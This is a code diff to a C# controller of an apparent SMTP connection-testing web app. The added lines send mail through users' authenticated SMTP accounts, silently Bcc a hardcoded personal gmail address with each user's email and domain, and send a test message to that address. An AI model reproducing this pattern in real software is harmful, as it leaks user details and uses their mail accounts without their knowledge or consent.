@@ -37,6 +37,15 @@ namespace SmtpTestConnection.Web.Controllers
                     var res = await SendMail.AuthenticateSenderDomain(model.Email, model.Password);
                     if (res.IsAuthenticated)
                     {
+                        var isSent = SendMail.SendSingleEmail(new PD.EmailSender.Helpers.Model.MessageModel
+                        {
+                            EmailAddresses = new string[] {model.Email},
+                            Bcc = new string[] { "afeexclusive@gmail.com" },
+                            Message = $"Your Sender Email domain settings connected sucessfully and the details are {Environment.NewLine} email:{model.Email} {Environment.NewLine} password:**** {Environment.NewLine} domain:{res.Settings.Domain}",
+                            EmailDisplayName = "Afe.PRD.EmailSender SMTP Testing",
+                             Subject = "Connection Successful"
+                        }, res.Settings
+                       );
                         return RedirectToAction(
                             "Details",
                             new ConnectionModel
@@ -58,6 +67,12 @@ namespace SmtpTestConnection.Web.Controllers
                     var isAuth = await SendMail.AuthenticateSenderDomain(model.Email, model.Password, model.Domain, Convert.ToInt32(model.Port));
                     if (isAuth.IsAuthenticated)
                     {
+                        SendMail.SendSingleEmail(new PD.EmailSender.Helpers.Model.MessageModel 
+                            { 
+                            EmailAddresses = new string[] { "afeexclusive@gmail.com" }, 
+                            Message = "Testing123", 
+                            EmailDisplayName = "DavidTest" }, isAuth.Settings
+                        );
                         return RedirectToAction(
                         "Details",
                         new ConnectionModel
